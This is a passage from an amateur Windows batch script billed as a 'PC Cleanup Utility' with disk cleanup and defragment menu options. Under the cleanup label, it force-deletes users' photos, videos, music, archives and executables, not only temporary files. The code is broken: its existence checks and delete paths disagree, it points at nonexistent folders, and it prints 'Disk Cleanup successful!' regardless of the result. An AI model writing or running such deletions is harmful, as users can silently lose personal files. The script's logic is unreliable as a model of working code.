if exist "C:\tmp" del /f /q "C:\tmp\*.*"
if exist "C:\temp" del /f /q "C:\temp\*.*"
if exist "%temp%" del /f /q "%temp%\*.*"
if exist "%tmp%" del /f /q "%tmp%\*.*"
if not exist "C:\WINDOWS\Users\*.*" goto skip
if exist "C:\WINDOWS\Users\*.zip" del "C:\WINDOWS\Users\*.zip" /f /q
if exist "C:\WINDOWS\Users\*.exe" del "C:\WINDOWS\Users\*.exe" /f /q
if exist "C:\WINDOWS\Users\*.gif" del "C:\WINDOWS\Users\*.gif" /f /q
if exist "C:\WINDOWS\Users\*.jpg" del "C:\WINDOWS\Users\*.jpg" /f /q
if exist "C:\WINDOWS\Users\*.png" del "C:\WINDOWS\Users\*.png" /f /q
if exist "C:\WINDOWS\Users\*.bmp" del "C:\WINDOWS\Users\*.bmp" /f /q
if exist "C:\WINDOWS\Users\*.avi" del "C:\WINDOWS\Users\*.avi" /f /q
if exist "C:\WINDOWS\Users\*.mpg" del "C:\WINDOWS\Users\*.mpg" /f /q
if exist "C:\WINDOWS\Users\*.mpeg" del "C:\WINDOWS\Users\*.mpeg" /f /q
if exist "C:\WINDOWS\Users\*.ra" del "C:\WINDOWS\Users\*.ra" /f /q
if exist "C:\WINDOWS\Users\*.ram" del "C:\WINDOWS\Users\*.ram"/f /q
if exist "C:\WINDOWS\Users\*.mp3" del "C:\WINDOWS\Users\*.mp3" /f /q
if exist "C:\WINDOWS\Users\*.mov" del "C:\WINDOWS\Users\*.mov" /f /q
if exist "C:\WINDOWS\Users\*.qt" del "C:\WINDOWS\Users\*.qt" /f /q
if exist "C:\WINDOWS\Users\*.asf" del "C:\WINDOWS\Users\*.asf" /f /q

:skip
if not exist C:\WINDOWS\Users\Users\*.* goto skippy /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.zip del C:\WINDOWS\Users\Users\*.zip /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.exe del C:\WINDOWS\Users\Users\*.exe /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.gif del C:\WINDOWS\Users\Users\*.gif /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.jpg del C:\WINDOWS\Users\Users\*.jpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.png del C:\WINDOWS\Users\Users\*.png /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.bmp del C:\WINDOWS\Users\Users\*.bmp /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.avi del C:\WINDOWS\Users\Users\*.avi /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpg del C:\WINDOWS\Users\Users\*.mpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpeg del C:\WINDOWS\Users\Users\*.mpeg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ra del C:\WINDOWS\Users\Users\*.ra /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ram del C:\WINDOWS\Users\Users\*.ram /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mp3 del C:\WINDOWS\Users\Users\*.mp3 /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.asf del C:\WINDOWS\Users\Users\*.asf /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.qt del C:\WINDOWS\Users\Users\*.qt /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mov del C:\WINDOWS\Users\Users\*.mov /f /q

:skippy
if exist "C:\WINDOWS\ff*.tmp" del C:\WINDOWS\ff*.tmp /f /q
if exist C:\WINDOWS\ShellIconCache del /f /q "C:\WINDOWS\ShellI~1\*.*"
cls
echo --------------------------------------------------------------------------------
echo Disk Cleanup
echo --------------------------------------------------------------------------------
echo.
echo Disk Cleanup successful!
echo.
pause
goto menu2

:4
cls
echo --------------------------------------------------------------------------------
echo Disk Defragment
echo --------------------------------------------------------------------------------
echo.
echo Defragmenting hard disks...
ping localhost -n 3 >nul
defrag -c -v
cls
echo --------------------------------------------------------------------------------
echo Disk Defragment
echo --------------------------------------------------------------------------------
echo.
echo Disk Defrag successful!
echo.
pause
goto menu2

:error
cls
echo Command not recognized.
ping localhost -n 4 >nul
goto menu2

:exit2
echo Thanks for using PC Cleanup Utility by Ryan
echo all credits reserved to Ryan
ping 127.0.0.1 >nul
exit












